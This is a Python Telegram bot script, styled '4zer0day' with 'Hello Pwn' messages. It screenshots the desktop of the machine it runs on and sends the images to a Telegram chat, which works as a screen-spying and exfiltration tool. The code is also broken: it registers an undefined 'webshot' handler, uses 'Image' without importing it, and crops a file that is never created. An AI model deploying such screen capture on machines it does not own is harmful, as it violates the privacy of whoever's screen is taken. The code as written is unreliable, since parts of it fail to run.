#!/usr/bin/env python3

#2021 telegram webs

import logging

from telegram import Update
from telegram.ext import Updater
from telegram.ext import CommandHandler
from telegram.ext import CallbackContext

import pyscreenshot as ImageGrab

import os
import time
from selenium import webdriver
import sys
from selenium.webdriver import ChromeOptions
from time import sleep


# Enable logging for terminal UI
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)

#ah you know this shit
def start(update: Update, context: CallbackContext)-> None:
    context.bot.send_message(chat_id=update.message.chat_id, text="Hello Pwn\n/capture - to screenshot your desktop\n/screenshot - to get part of your desktop")

#screenshot example for full size desktop
def capture(update: Update, context: CallbackContext)-> None:
    context.bot.send_message(chat_id=update.message.chat_id, text="[4zer0day capturing your soul] [Please wait...]")
    print("\n[4zer0day Capturing...]")
    time.sleep(2)
    im = ImageGrab.grab()
    im.save("zer0day.png", "PNG")
    print("HOPE YOUR SOUL IS IN PEACE")
    context.bot.send_photo(chat_id=update.message.chat_id, photo=open('zer0day.png', 'rb'))
    print("Succesfully sent to your soul")

    im.close()  # close file before remove the image
    #function for removing back the image to save your fucking memory
    os.remove("zer0day.png")

#screenshot example with sizing
def screenshot(update: Update, context: CallbackContext)-> None:
    context.bot.send_message(chat_id=update.message.chat_id, text="[4zer0day capturing part your soul] [Please wait...]")
    print("\n[4zer0day Capturing...]")
    time.sleep(2)
    im2 = ImageGrab.grab(bbox=(10, 10, 510, 510)) # X1,Y1,X2,Y2 #!WARNING X2 cannot be less than X1
    im2.save("zer0day.png", "PNG")

    print("4zer0day sending your dead image...")
    context.bot.send_photo(chat_id=update.message.chat_id, photo=open('zer0day.png', 'rb'))
    print("Succesfully sent to your soul")

    im2.close()  # close file before remove the image
    # function for removing back the image to save your fucking memory part 2
    os.remove("zer0day.png")


#screenshot a website but yall gotta install chrome selium driver first
def webshot2(update: Update, context: CallbackContext)-> None:
    context.bot.send_message(chat_id=update.message.chat_id, text="[4zer0day capturing part your soul] [Please wait...]")
    print("\n[4zer0day Capturing...]")
    time.sleep(2)
    driver = webdriver.Chrome();
    driver.get('https://www.google.com');
    element = driver.find_element_by_id("hplogo");
    location = element.location;
    size = element.size;
    driver.save_screenshot("zer0day.png");

    # crop image
    x = location['x'];
    y = location['y'];
    width = location['x'] + size['width'];
    height = location['y'] + size['height'];
    im = Image.open('pageImage.png')
    im = im.crop((int(x), int(y), int(width), int(height)))
    im.save('element.png')

    driver.quit()

    print("4zer0day sending your dead image...")
    context.bot.send_photo(chat_id=update.message.chat_id, photo=open('zer0day.png', 'rb'))
    print("Succesfully sent to your soul")

#main function
def main():

    updater = Updater("Insert your Token Here :D", use_context=True)
    dispatcher = updater.dispatcher

    #dispatcher handler
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("capture", capture))
    dispatcher.add_handler(CommandHandler("screenshot", screenshot))
    dispatcher.add_handler(CommandHandler("webshot", webshot))
    dispatcher.add_handler(CommandHandler("webshot2", webshot2))

    print("Running bot now.")
    updater.start_polling()
    updater.idle()

#running your main
if __name__ == '__main__':
    main()

